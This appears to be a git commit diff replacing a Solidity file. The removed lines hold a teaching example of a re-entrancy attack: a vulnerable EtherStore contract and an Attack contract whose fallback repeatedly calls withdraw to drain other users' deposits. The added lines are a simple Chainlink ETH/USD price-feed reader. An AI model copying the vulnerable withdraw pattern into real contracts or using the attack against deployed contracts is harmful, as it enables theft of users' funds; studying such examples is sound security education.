83877c894d7e4be76941ed1423568b4ca2c731c9
slowisfast <slowisfast2030@163.com>
2023-05-25 21:12:41 +0800

    less is more

--- temp.sol
+++ temp.sol
@@ -1,80 +1,38 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.4.26;
+pragma solidity ^0.8.17;
 
-/*
-EtherStore is a contract where you can deposit and withdraw ETH.
-This contract is vulnerable to re-entrancy attack.
-Let's see why.
+// import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
 
-1. Deploy EtherStore
-2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
-3. Deploy Attack with address of EtherStore
-4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
-   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
-   plus 1 Ether sent from this contract).
+contract ChainlinkPriceOracle {
+    AggregatorV3Interface internal priceFeed;
 
-What happened?
-Attack was able to call EtherStore.withdraw multiple times before
-EtherStore.withdraw finished executing.
-
-Here is how the functions were called
-- Attack.attack
-- EtherStore.deposit
-- EtherStore.withdraw
-- Attack fallback (receives 1 Ether)
-- EtherStore.withdraw
-- Attack.fallback (receives 1 Ether)
-- EtherStore.withdraw
-- Attack fallback (receives 1 Ether)
-*/
-
-contract EtherStore {
-    mapping(address => uint) public balances;
-
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
+    constructor() {
+        // ETH / USD
+        priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);
     }
 
-    function withdraw() public {
-        uint bal = balances[msg.sender];
-        require(bal > 0);
-
-        //(bool sent, ) = msg.sender.call{value: bal}("");
-        bool sent = msg.sender.call.value(bal)("");
-        require(sent, "Failed to send Ether");
-
-        balances[msg.sender] = 0;
-    }
-
-    // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint) {
-        return address(this).balance;
+    function getLatestPrice() public view returns (int) {
+        (
+            uint80 roundID,
+            int price,
+            uint startedAt,
+            uint timeStamp,
+            uint80 answeredInRound
+        ) = priceFeed.latestRoundData();
+        // for ETH / USD price is scaled up by 10 ** 8
+        return price / 1e8;
     }
 }
 
-contract Attack {
-    EtherStore public etherStore;
-
-    constructor(address _etherStoreAddress) public {
-        etherStore = EtherStore(_etherStoreAddress);
-    }
-
-    // Fallback is called when EtherStore sends Ether to this contract.
-    function() public payable {
-        if (address(etherStore).balance >= 1 ether) {
-            etherStore.withdraw();
-        }
-    }
-
-    function attack() public payable {
-        require(msg.value >= 1 ether);
-
-        etherStore.deposit.value(1 ether)();
-        etherStore.withdraw();
-    }
-
-    // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint) {
-        return address(this).balance;
-    }
+interface AggregatorV3Interface {
+    function latestRoundData()
+        external
+        view
+        returns (
+            uint80 roundId,
+            int answer,
+            uint startedAt,
+            uint updatedAt,
+            uint80 answeredInRound
+        );
 }
